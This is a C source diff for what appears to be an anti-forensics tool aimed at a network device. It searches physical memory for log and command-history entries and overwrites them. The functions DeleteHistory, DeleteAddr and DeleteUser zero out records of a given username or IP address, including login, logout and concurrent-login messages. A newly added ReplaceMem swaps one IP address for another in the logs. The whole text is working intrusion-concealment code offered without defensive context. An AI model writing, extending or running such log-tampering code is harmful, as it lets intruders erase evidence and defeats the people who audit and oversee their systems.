@@ -386,7 +386,7 @@ int ParseCommandHistoryHeader(char * data,char * begin,unsigned long * value)
 }
 
 int MakeLoginTag(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM_LIMIT][256],
-char str[SEARCH_ITEM_LIMIT][256],int *strSize)
+char str[SEARCH_ITEM_LIMIT][256],int *strSize,int type[SEARCH_ITEM_LIMIT])
 {
 	pid_t mypid = getpid();
 	char * szboundary = "this is my bundary";
@@ -394,14 +394,26 @@ char str[SEARCH_ITEM_LIMIT][256],int *strSize)
 	int total = 0;
 	int i = 0;
 	for( i = 0;i < count;i ++){
-		int length = sprintf(str[i],format[i],tag[i]);
-		
-		int len = strlen(str[i]);
-		
-		strSize[i] = len;
+		if(type[i] == TPYE_UTF8STRING){
+			int length = sprintf(str[i],format[i],tag[i]);
 			
-		memcpy(str[i] + strSize[i] + 1,&mypid,sizeof(pid_t));
-		strcpy(str[i] + strSize[i] + 1 + sizeof(pid_t),szboundary);
+			int len = strlen(str[i]);
+			
+			strSize[i] = len;
+				
+			memcpy(str[i] + strSize[i] ,&mypid,sizeof(pid_t));
+			strcpy(str[i] + strSize[i] + sizeof(pid_t),szboundary);
+		}
+		else if(type[i] == TYPE_INT)
+		{
+			memcpy(str[i],tag[i],sizeof(int));
+			strSize[i] = sizeof(int);
+			memcpy(str[i] + strSize[i] ,&mypid,sizeof(pid_t));
+			strcpy(str[i] + strSize[i]  + sizeof(pid_t),szboundary);
+		}
+		else{
+			
+		}
 		
 		//mylog("str[%d]:%s\r\n",i,str[i]);
 		
@@ -472,8 +484,13 @@ int deleteLog_old(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_
 	
 	char str[SEARCH_ITEM_LIMIT][256];
 	int strSize[SEARCH_ITEM_LIMIT];
+	int type[SEARCH_ITEM_LIMIT];
+	int cnt = 0;
+	for(cnt = 0;cnt < count;cnt ++){
+		type[cnt] = TPYE_UTF8STRING;
+	}
 	//makeTestStr(str);
-	result = MakeLoginTag(format,count,tag,str,strSize);
+	result = MakeLoginTag(format,count,tag,str,strSize,type);
 	
 	int pagesize =  getpagesize();
 	int pagemask = ~(pagesize - 1);
@@ -510,7 +527,7 @@ int deleteLog_old(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_
 		//int cmpsize = rlen - strSize;
 		int idx = 0;
 		int seq = 0;
-		int cnt = 0;
+
 		for(idx = 0;idx <= rlen-1;idx++)
 		{
 
@@ -524,12 +541,8 @@ int deleteLog_old(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_
 					
 					if( str[seq][0] == *(data+idx) && str[seq][1] == *(data+idx+1) && 
 					MyMemCmp(data+idx,str[seq],strSize[seq])== 0 ){
-						if( *(data + idx + strSize[seq]) == 0)
-						{
-							
-						}
-						else if( *(pid_t*)(data + idx + strSize[seq] + 1) == mypid
-						/*&& MyStrCmp(data + idx + strSize[seq] + 1 + sizeof(pid_t),szboundary) == 0*/ )
+						if( *(pid_t*)(data + idx + strSize[seq] ) == mypid
+						/*&& MyStrCmp(data + idx + strSize[seq] + sizeof(pid_t),szboundary) == 0*/ )
 						{
 							//mylog("Find same process string at file offset:%x,value:%s\r\n",total + idx,data + idx);
 						}
@@ -836,7 +849,6 @@ int DeleteDateTime(char * strParam){
 		return 0;
 	}
 
-	
 	mylog("start:%d,end:%d\r\n",start,stop);
 	
 	char startstr[256];
@@ -890,7 +902,6 @@ int DeleteDateTime(char * strParam){
 	{
 		memTotal = PHYSICAL_MEMORY_LIMIT;
 	}
-	
 	
 	char * logTag = "%STKUNIT";
 	int logTagLen = strlen("%STKUNIT");
@@ -1002,7 +1013,8 @@ int DeleteDateTime(char * strParam){
 
 //#define __KMP_SEARCH__
 
-int deleteLog(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM_LIMIT][256],GetStringHdr_cb *GetStrHdr) {
+int deleteLog(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM_LIMIT][256],GetStringHdr_cb *GetStrHdr,
+char replace[SEARCH_ITEM_LIMIT][256],int type[SEARCH_ITEM_LIMIT]) {
 	int result = 0;
 	
     int fd = 0;
@@ -1059,7 +1071,7 @@ int deleteLog(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM
 	}
 #endif
 	//makeTestStr(str);
-	result = MakeLoginTag(format,count,tag,str,strSize);
+	result = MakeLoginTag(format,count,tag,str,strSize,type);
 	
 	int pagesize =  getpagesize();
 	int pagemask = ~(pagesize - 1);
@@ -1072,8 +1084,7 @@ int deleteLog(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM
 	mylog("physical memory size:%x\r\n",memTotal);
 	
 	int findTag = 0;
-	
-	
+		
 	int delta1[SEARCH_ITEM_LIMIT][ALPHABET_LEN];
     int delta2[SEARCH_ITEM_LIMIT][ALPHABET_LEN];
 	for(cnt = 0;cnt < count;cnt ++){
@@ -1122,11 +1133,8 @@ int deleteLog(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM
 					unsigned long findPos = mypos;
 					mypos += strSize[seq];
 					
-					if( *(data + mypos) == 0){
-
-					}
-					else if( *(pid_t*)(data + mypos + 1) == mypid
-					/*&& MyStrCmp(data + mypos + strSize[seq] + 1 + sizeof(pid_t),szboundary) == 0*/ )
+					if( *(pid_t*)(data + mypos) == mypid
+					/*&& MyStrCmp(data + mypos + strSize[seq] + sizeof(pid_t),szboundary) == 0*/ )
 					{
 
 					}
@@ -1150,8 +1158,14 @@ int deleteLog(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM
 									perror("mmap\r\n");
 									break;
 								}
-								else{						
-									memcpy((char*)mapaddr+hdrPageOffset,"\x00\x00\x00\x00",4);
+								else{
+									if(type[seq] == TPYE_UTF8STRING){
+										
+										memcpy((char*)mapaddr+hdrPageOffset,replace[seq],4);
+									}
+									else if(type[seq] == TYPE_INT){
+										memcpy((char*)mapaddr+hdrPageOffset,replace[seq],sizeof(int));
+									}
 									//mylog("new address:%x,new string:%s\r\n",mapaddr+hdrPageOffset, mapaddr+hdrPageOffset);
 								}
 								
@@ -1214,17 +1228,23 @@ int DeleteHistory(char * username){
 	
 	char format[SEARCH_ITEM_LIMIT][256];
 	GetStringHdr_cb callback[SEARCH_ITEM_LIMIT];
+	char replace[SEARCH_ITEM_LIMIT][256];
+	int type[SEARCH_ITEM_LIMIT];
 	
 	int seq = 0;
 	strcpy(tag[seq],username);
 	callback[seq] = ParseCommandHistoryHeader;
+	memcpy(replace[seq],"\x00\x00\x00\x00",4);
+	type[seq] = TPYE_UTF8STRING;
 	strcpy(format[seq++],"]by %s from ");
 	
 	strcpy(tag[seq],"");
 	callback[seq] = ParseDummy;
+	memcpy(replace[seq],"\x00\x00\x00\x00",4);
+	type[seq] = TPYE_UTF8STRING;
 	//strcpy(format[seq++],"\t - Repeated %s");
 
-	ret = deleteLog(format,seq,tag,callback);
+	ret = deleteLog(format,seq,tag,callback,replace,type);
 	
 	return ret;
 	
@@ -1237,14 +1257,21 @@ int DeleteAddr(char * ip){
 	
 	char format[SEARCH_ITEM_LIMIT][256];
 	GetStringHdr_cb callback[SEARCH_ITEM_LIMIT];
+	char replace[SEARCH_ITEM_LIMIT][256];
+	int type[SEARCH_ITEM_LIMIT];
+	
 	int seq = 0;
 	if(ip){
 		seq = 0;
 		strcpy(tag[seq],ip);
 		callback[seq] = ParseLogHeader;
+		memcpy(replace[seq],"\x00\x00\x00\x00",4);
+		type[seq] = TPYE_UTF8STRING;
 		strcpy(format[seq++]," ( %s )");
+		
 		//strcpy(format[seq++],"-CONNECTION: Disconnected from %s\n");
-		ret = deleteLog(format,seq,tag,callback);
+		
+		ret = deleteLog(format,seq,tag,callback,replace,type);
 	}
 	
 	return 0;
@@ -1264,19 +1291,29 @@ int DeleteUser(char * username){
 	
 	char format[SEARCH_ITEM_LIMIT][256];
 	GetStringHdr_cb callback[SEARCH_ITEM_LIMIT];
+	char replace[SEARCH_ITEM_LIMIT][256];
+	int type[SEARCH_ITEM_LIMIT];
 	
 	int seq = 0;
 	strcpy(tag[seq],username);
 	callback[seq] = ParseLogHeader;
+	memcpy(replace[seq],"\x00\x00\x00\x00",4);
+	type[seq] = TPYE_UTF8STRING;
 	strcpy(format[seq++],"-LOGOUT: Exec session is terminated for user %s on line ");
+	
 	strcpy(tag[seq],username);
 	callback[seq] = ParseLogHeader;
+	memcpy(replace[seq],"\x00\x00\x00\x00",4);
+	type[seq] = TPYE_UTF8STRING;
 	strcpy(format[seq++],"-LOGIN_SUCCESS: Login successful for user %s on line ");
+	
 	strcpy(tag[seq],username);
 	callback[seq] = ParseLogHeader;
+	memcpy(replace[seq],"\x00\x00\x00\x00",4);
+	type[seq] = TPYE_UTF8STRING;
 	strcpy(format[seq++],"-CONCURRENT_LOGIN: User %s has ");
 	
-	ret = deleteLog(format,seq,tag,callback);
+	ret = deleteLog(format,seq,tag,callback,replace,type);
 	
 	return ret;
 }
@@ -1285,4 +1322,56 @@ int DeleteUser(char * username){
 int ParseDummy(char * data,char * begin,unsigned long * value){
 	value[0] =(unsigned long) data;
 	return 1;
+}
+
+
+
+int ReplaceMem(char * strParam){
+	int ret = 0;
+	
+	char * sep = strstr(strParam,"-");
+	if(sep){
+
+	}
+	else{
+		sep = strstr(strParam,"_");
+		if(sep == 0){
+			return 0;
+		}
+	}
+	char strlabel[256]={0};
+	char strdata[256]={0};
+	memcpy(strlabel,strParam,sep - strParam);
+	strcpy(strdata,sep + 1);
+	
+	unsigned long label = strtoul(strlabel,0,16);
+	unsigned long data = strtoul(strdata,0,16);
+	
+	mylog("replace label:%x with value:%x\r\n",label,data);
+	
+	char strip_old[256];
+	char strip_new[256];
+	char * addresss = inet_ntoa(label);
+	strcpy(strip_old,addresss);
+	addresss = inet_ntoa(data);
+	strcpy(strip_new,addresss);
+	mylog("replace ip:%x with ip:%x\r\n",strip_old,strip_new);
+	
+	char tag[SEARCH_ITEM_LIMIT][256];
+	
+	char format[SEARCH_ITEM_LIMIT][256];
+	GetStringHdr_cb callback[SEARCH_ITEM_LIMIT];
+	char replace[SEARCH_ITEM_LIMIT][256];
+	
+	int type[SEARCH_ITEM_LIMIT];
+	
+	int seq = 0;
+	memcpy(tag[seq],&label,sizeof(int));
+	callback[seq] = ParseDummy;
+	strcpy(format[seq],"");
+	type[seq] = TYPE_INT;
+	memcpy(replace[seq++],&data,sizeof(int));
+	
+	ret = deleteLog(format,seq,tag,callback,replace,type);
+	return ret;
 }
